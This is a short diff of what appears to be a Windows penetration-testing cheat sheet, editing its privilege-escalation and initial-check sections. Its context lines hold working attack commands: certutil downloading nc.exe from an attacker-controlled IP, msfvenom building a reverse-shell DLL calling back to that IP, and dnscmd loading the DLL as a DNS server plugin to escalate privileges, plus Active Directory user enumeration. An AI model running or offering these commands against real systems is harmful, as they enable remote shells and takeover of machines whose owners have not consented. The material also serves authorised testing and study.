@@ -1295,7 +1295,7 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-powershell -c "whoami /user /priv /groups"
+powershell -c "whoami /priv"
 Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties MemberOf,AdminCount | Select SamAccountName,AdminCount,@{N='Groups';E={[string]::Join('; ',($_.MemberOf|%{($_ -split ',')[0]-replace '^CN='}))}} | Sort AdminCount -Desc | Format-Table -AutoSize -Wrap
 net user $USERNAME
 
@@ -1317,6 +1317,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
 
 +---------- Initial Checks ----------+
+netstat -an | findstr LISTENING
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 powershell -c 'Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike """*Microsoft*""" } | Select-Object DisplayName, DisplayVersion, Publisher'
 powershell -c "ls -force \\"
